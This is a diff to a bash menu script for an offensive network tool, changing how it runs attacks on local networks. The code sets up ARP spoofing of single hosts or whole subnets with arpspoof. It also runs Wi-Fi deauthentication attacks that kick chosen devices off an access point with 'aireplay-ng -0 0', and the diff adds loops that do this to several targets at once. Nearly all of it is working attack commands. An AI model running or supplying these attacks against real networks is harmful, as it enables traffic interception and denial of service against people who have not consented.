@@ -82,7 +82,7 @@ do
             arp-scan --localnet -x 
             echo -e "\e[1;34mYour scan completed!\e[0m"
             sleep 2
-            echo -e "\e[1;32mPress RETURN To Continue \c\e[0m"
+            echo -e "$blue""PRESS RETURN TO CONTINUE$nc"
             read input
             sleep 0.5
         ;;
@@ -110,7 +110,7 @@ do
                     rm simplescan.txt
                     echo -e "\e[1;34mYour scan completed!\e[0m"
                     sleep 2
-                    echo -e "\e[1;32mPress RETURN To Continue \c\e[0m"
+                    echo -e "$blue""PRESS RETURN TO CONTINUE$nc"
                     read input
                     echo -e "$blue""Going back to Menu...$nc"
                     sleep 1
@@ -190,7 +190,7 @@ do
                     xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $target $gateway" &
                     xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $gateway $target" &
                     sleep 1
-                    echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                    echo -e "$blue""PRESS RETURN TO CANCEL$nc"
                     read input
                     pkill arpspoof
                     echo -e "$blue""Going back to Menu...$nc"
@@ -227,7 +227,7 @@ do
                         nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                     done
                     sleep 1
-                    echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                    echo -e "$blue""PRESS RETURN TO CANCEL$nc"
                     read input
                     pkill arpspoof
                     echo -e "$blue""Going back to Menu...$nc"
@@ -268,7 +268,7 @@ do
                         read ip_whl
                         echo "IP to whitelist : $ip_whl "
                         grep -v "$ip_whl" scan.txt > temp && mv temp scan.txt
-                        echo -e "\e[1;33mPRESS RETURN TO START THE ATTACK! \c\e[0m"
+                        echo -e "$blue""PRESS RETURN TO START ATTACK$nc"
                         read input
                         i=0
                         while IFS= read -r line; do
@@ -292,7 +292,7 @@ do
                             nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                             sleep 1
                         done
-                        echo -e "\e[1;32mPRESS RETURN TO CANCLE \c\e[0m"
+                        echo -e "$blue""PRESS RETURN TO CANCEL$nc"
                         read input
                         pkill arpspoof
                         rm scan.txt
@@ -321,7 +321,7 @@ do
                             nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                             sleep 1
                         done 
-                        echo -e "\e[1;32mPRESS RETURN TO CANCLE \c\e[0m"
+                        echo -e "$blue""PRESS RETURN TO CANCEL$nc"
                         read input
                         pkill arpspoof
                         rm scan.txt
@@ -342,13 +342,13 @@ do
                     break;
             done 
             chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
-            connected_ap_essid=$(nmcli -t -f name,device connection show --active | grep "$interface" | cut -d\: -f1)
+            connected_ap_essid=$(iwconfig $interface 2> /dev/null | awk -F\" '{print $2}')
             printf "$connected_ap_essid" > connected_ap_essid.txt
             ESSID=$(grep -m1 "" connected_ap_essid.txt)
             connected_ap_bssid=$(iwconfig "$interface" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
             printf "$connected_ap_bssid" > connected_ap_bssid.txt
             BSSID=$(grep -m1 "" connected_ap_bssid.txt)
-            echo -e "Connected to "" : ""$connected_ap_essid | BSSID : "$connected_ap_bssid""
+            echo -e "Connected to "" : ""$connected_ap_essid | BSSID : $connected_ap_bssid"
             sleep 0.2
             echo -e "$blue""Interface current mode: $nc"$green""$chk_mode""
             echo ""
@@ -370,22 +370,28 @@ do
                             echo "Searching For Access-Points..."
                             echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                             sleep 1
-                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng $interface 2>&1 | tee ap_scan.txt" &&
-                            cat ap_scan.txt
+                            sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
+                            cat aps_scan.txt
                             echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
                             read ap_mac
                             echo -e -n "$orange""Type Access-Point's Channel :  $nc"
-                            read dv_chan
+                            read ap_chan
+                            echo "Searching For Clients For Selected Access Point..."
+                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            cat ap_scan.txt
                             echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
                             read dv_mac
-                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $dv_chan $interface " & sleep 2 
+                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2 
                             xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
-                            sleep 0.5
-                            echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                            echo -e "$blue""PRESS RETURN TO CANCEL$nc"
                             read input
                             pkill airodump-ng
                             pkill aireplay-ng
-                            echo "Restoring device to managed mode... "
+                            echo 'Cleaning files...'
+                            rm ap_scan.txt aps_scan_txt
+                            sleep 0.5
+                            echo "Restoring interface to managed mode... "
                             sudo ifconfig "$interface" down >/dev/null 2>&1
                             sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                             sudo ifconfig "$interface" up >/dev/null 2>&1
@@ -410,30 +416,37 @@ do
                                         sleep 1
                                         clear
                                         echo "Searching For Access-Points..."
-                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
-                            sleep 1
-                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng $interface 2>&1 | tee ap_scan.txt" &&
-                            cat ap_scan.txt
-                            echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
-                            read ap_mac
-                            echo -e -n "$orange""Type Access-Point's Channel :  $nc"
-                            read dv_chan
-                            echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
-                            read dv_mac
-                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $dv_chan $interface " & sleep 2 
-                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
-                            echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
-                            read input
-                            pkill airodump-ng
-                            pkill aireplay-ng
-                            echo "Restoring device to managed mode... "
-                            sudo ifconfig "$interface" down >/dev/null 2>&1
-                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
-                            sudo ifconfig "$interface" up >/dev/null 2>&1
-                            sudo systemctl restart NetworkManager 
-                            sleep 5
-                            echo -e "$blue""Going back to Menu...$nc"
-                            sleep 1
+                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        sleep 1
+                                        sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
+                                        cat aps_scan.txt
+                                        echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                                        read ap_mac
+                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        read ap_chan
+                                        echo "Searching For Clients For Selected Access Point..."
+                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                                        cat ap_scan.txt
+                                        echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
+                                        read dv_mac
+                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $ap_chan $interface " & sleep 2 
+                                        xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
+                                        echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                                        read input
+                                        pkill airodump-ng
+                                        pkill aireplay-ng
+                                        echo 'Cleaning files...'
+                                        rm ap_scan.txt aps_scan.txt
+                                        sleep 0.5
+                                        echo "Restoring interface to managed mode... "
+                                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                                        sudo systemctl restart NetworkManager 
+                                        sleep 5
+                                        echo -e "$blue""Going back to Menu...$nc"
+                                        sleep 1
                                     else 
                                         echo -e "$red""Unable to change interface to monitor mode!$nc"
                                         echo -e "$red""Your interface doesn't support monitor mode!$nc"
@@ -451,7 +464,7 @@ do
                             fi
                         fi     
                     fi
-                    else
+                else
                     chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                     if [ "$chk_mode" = "monitor" ]; then
                             echo "Monitor mode already enabled!"
@@ -460,7 +473,7 @@ do
                             echo "Monitoring your Access-Point '$ESSID'"
                             echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
                             sleep 1
-                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                             cat ap_scan.txt
                             #echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
                             #read ap_mac
@@ -468,10 +481,10 @@ do
                             read dv_mac
                             xterm -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface" &
                             sleep 0.5
-                            echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                            echo -e "$blue""PRESS RETURN TO CANCEL$nc"
                             read input
                             pkill aireplay-ng
-                            echo "Restoring device to managed mode... "
+                            echo "Restoring interface to managed mode... "
                             sleep 1
                             sudo ifconfig "$interface" down >/dev/null 2>&1
                             sudo iwconfig "$interface" mode managed >/dev/null 2>&1
@@ -498,22 +511,22 @@ do
                                         echo "Monitoring your Access-Point '$ESSID'"
                                         echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
                                         sleep 1
-                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                                         clear
                                         cat ap_scan.txt
                                         echo -e -n "$orange""Type Target's MAC-Address :  $nc"
                                         read dv_mac
                                         echo -e -n "$orange""Type Access-Point's Channel :  $nc"
-                                        read dv_chan
+                                        read ap_chan
                                         echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                         sleep 0.5
-                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID -c $dv_chan $interface " & sleep 2 
+                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2 
                                         xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
-                                        echo -e "\e[1;32mPress RETURN TO STOP KICKING \c\e[0m"
+                                        echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
                                         read input
                                         pkill airodump-ng
                                         pkill aireplay-ng
-                                        echo "Restoring device to managed mode... "
+                                        echo "Restoring interface to managed mode... "
                                         sudo ifconfig "$interface" down >/dev/null 2>&1
                                         sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                         sudo ifconfig "$interface" up >/dev/null 2>&1
@@ -540,27 +553,148 @@ do
                     fi
                 fi
                 ;;
-                2)
-                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
-                if [ "$chk_mode" = "monitor" ]; then
+                2) 
+                if [ "$BSSID" = "" ]; then
+                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                        if [ "$chk_mode" = "monitor" ]; then
+                            echo "Searching For Access-Points..."
+                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            sleep 1
+                            sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
+                            cat aps_scan.txt
+                            echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                            read ap_mac
+                            echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                            read ap_chan
+                            echo "Searching For Clients For Selected Access Point..."
+                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            cat ap_scan.txt
+                            echo -e -n "$yellow""How many target(s)? $nc"
+                            read targets
+                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2
+                            for (( i = 1; i < targets+1; i++ )); do
+                                echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                read dv_mac
+                                echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                                sleep 0.5
+                                xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
+                            done                                    
+                            echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                            read input
+                            pkill airodump-ng
+                            pkill aireplay-ng
+                            echo 'Cleaning files...'
+                            rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
+                            sleep 0.5
+                            echo "Restoring interface to managed mode... "
+                            sleep 1
+                            sudo ifconfig "$interface" down >/dev/null 2>&1
+                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                            sudo ifconfig "$interface" up >/dev/null 2>&1
+                            sudo systemctl restart NetworkManager 
+                            echo -e "$blue""Going back to Menu...$nc"
+                            sleep 5
+                        else
+                            if [ "$chk_mode" = "managed" ]; then 
+                                echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
+                                sleep 0.3
+                                echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                                read answ3
+                                if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
+                                    sudo airmon-ng check kill >/dev/null 2>&1
+                                    sudo ifconfig "$interface" down >/dev/null 2>&1
+                                    sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
+                                    sudo ifconfig "$interface" up >/dev/null 2>&1
+                                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                                    if [ "$chk_mode" = "monitor" ] ;then
+                                        echo "Monitor mode enabled!"
+                                        sleep 1
+                                        clear
+                                        echo "Searching For Access-Points..."
+                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        sleep 1
+                                        sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
+                                        cat aps_scan.txt
+                                        echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                                        read ap_mac
+                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        read ap_chan
+                                        echo "Searching For Clients For Selected Access Point..."
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        cat ap_scan.txt
+                                        echo -e -n "$yellow""How many target(s)? $nc"
+                                        read targets
+                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2
+                                        for (( i = 1; i < targets+1; i++ )); do
+                                            echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                            read dv_mac
+                                            echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                                            sleep 0.5
+                                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
+                                        done                                    
+                                        echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                                        read input
+                                        pkill airodump-ng
+                                        pkill aireplay-ng
+                                        echo 'Cleaning files...'
+                                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
+                                        sleep 0.5
+                                        echo "Restoring interface to managed mode... "
+                                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                                        sudo systemctl restart NetworkManager 
+                                        sleep 5
+                                        echo -e "$blue""Going back to Menu...$nc"
+                                        sleep 1
+                                    else 
+                                         echo -e "$red""Unable to change interface to monitor mode!$nc"
+                                        break
+                                    fi
+                                 else    
+                                    echo "Going back to menu..."
+                                    sleep 1
+                                fi
+                            fi 
+                        fi       
+                else 
+                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                    if [ "$chk_mode" = "monitor" ]; then
                         echo "Monitor mode already enabled!"
                         sleep 1           
                         clear
                         echo "Monitoring your Access-Point '$ESSID'"
                         echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
                         sleep 1
-                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
+                        clear
                         cat ap_scan.txt
-                        #echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
-                        #read ap_mac
-                        echo -e -n "$orange""Type Device's MAC-Address :  $nc"
-                        read dv_mac
-                        xterm -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac" &
-                        sleep 0.5
-                        echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                        read dv_chan
+                        echo "Searching For Clients For Selected Access Point..."
+                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                        cat ap_scan.txt
+                        echo -e -n "$yellow""How many target(s)? $nc"
+                        read targets
+                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID -c $dv_chan $interface " & sleep 2
+                        for (( i = 1; i < targets+1; i++ )); do
+                            echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                            read dv_mac
+                            echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                            sleep 0.5
+                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
+                        done
+                        echo -e "$blue""Press RETURN TO STOP KICKING$nc"
                         read input
+                        pkill airodump-ng
                         pkill aireplay-ng
-                        echo "Restoring device to managed mode... "
+                        echo 'Cleaning files...'
+                                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
+                                        sleep 0.5
+                        echo "Restoring interface to managed mode... "
                         sleep 1
                         sudo ifconfig "$interface" down >/dev/null 2>&1
                         sudo iwconfig "$interface" mode managed >/dev/null 2>&1
@@ -568,63 +702,69 @@ do
                         sudo systemctl restart NetworkManager 
                         echo -e "$blue""Going back to Menu...$nc"
                         sleep 5
-                        else
-                    if [ "$chk_mode" = "managed" ]; then 
-                        echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
-                        sleep 0.3
-                        echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
-                        read answ3
-                        if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
-                            sudo airmon-ng check kill >/dev/null 2>&1
-                            sudo ifconfig "$interface" down >/dev/null 2>&1
-                            sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
-                            sudo ifconfig "$interface" up >/dev/null 2>&1
-                            chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
-                                if [ "$chk_mode" = "monitor" ] ;then
-                                    echo "Monitor mode enabled!"
-                                    sleep 1
-                                    clear
-                                    echo "Monitoring your Access-Point '$ESSID'"
-                                    echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
-                                    sleep 1
-                                    sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
-                                    clear
-                                    cat ap_scan.txt
-                                    echo -e -n "$orange""Type Access-Point's Channel :  $nc"
-                                    read dv_chan
-                                    echo -e -n "$yellow""How many target(s)? $nc"
-                                    read targets
-                                    xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID -c $dv_chan $interface " & sleep 2
-                                    for (( i = 1; i < targets+1; i++ )); do
-                                        echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
-                                        read dv_mac
-                                        echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                    else
+                        if [ "$chk_mode" = "managed" ]; then 
+                            echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
+                            sleep 0.3
+                            echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                            read answ3
+                            if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
+                                sudo airmon-ng check kill >/dev/null 2>&1
+                                sudo ifconfig "$interface" down >/dev/null 2>&1
+                                sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
+                                sudo ifconfig "$interface" up >/dev/null 2>&1
+                                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                                    if [ "$chk_mode" = "monitor" ] ;then
+                                        echo "Monitor mode enabled!"
+                                        sleep 1
+                                        clear
+                                        echo "Monitoring your Access-Point '$ESSID'"
+                                        echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                                        sleep 1
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
+                                        clear
+                                        cat ap_scan.txt
+                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        read dv_chan
+                                        echo "Searching For Clients For Selected Access Point..."
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        cat ap_scan.txt
+                                        echo -e -n "$yellow""How many target(s)? $nc"
+                                        read targets
+                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID -c $dv_chan $interface " & sleep 2
+                                        for (( i = 1; i < targets+1; i++ )); do
+                                            echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                            read dv_mac
+                                            echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                                            sleep 0.5
+                                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
+                                        done
+                                        echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                                        read input
+                                        pkill airodump-ng
+                                        pkill aireplay-ng
+                                        echo 'Cleaning files...'
+                                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
                                         sleep 0.5
-                                         
-                                        xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
-                                    done
-                                    
-                                    echo -e "\e[1;32mPress RETURN TO STOP KICKING \c\e[0m"
-                                    read input
-                                    pkill airodump-ng
-                                    pkill aireplay-ng
-                                    echo "Restoring device to managed mode... "
-                                    sudo ifconfig "$interface" down >/dev/null 2>&1
-                                    sudo iwconfig "$interface" mode managed >/dev/null 2>&1
-                                    sudo ifconfig "$interface" up >/dev/null 2>&1
-                                    sudo systemctl restart NetworkManager 
-                                    sleep 5
-                                    echo -e "$blue""Going back to Menu...$nc"
-                                    sleep 1
-                                else 
-                                     echo -e "$red""Unable to change interface to monitor mode!$nc"
-                                     break
-                                fi
-                        else    
-                            echo "Going back to menu..."
-                             sleep 1
-                        fi
-                    fi     
+                                        echo "Restoring deinterfacevice to managed mode... "
+                                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                                        sudo systemctl restart NetworkManager 
+                                        sleep 5
+                                        echo -e "$blue""Going back to Menu...$nc"
+                                        sleep 1
+                                    else 
+                                        echo -e "$red""Unable to change interface to monitor mode!$nc"
+                                        break
+                                    fi
+                            else    
+                                echo "Going back to menu..."
+                                sleep 1
+                            fi
+                        fi  
+                    fi    
                 fi
                 ;;
                 esac
@@ -705,7 +845,10 @@ do
                 exit 1
             fi
                     ;;
-        e)
+        e)  echo 'Cleaning Files...'
+            rm aps_scan.txt connected_ap_bssid.txt connected_ap_essid.txt hosts.txt scan.txt >/dev/null 2>&1
+            sleep 0.5
+
             echo -e "$lightred""Bye bye :)$nc"
             sleep 0.5
             clear
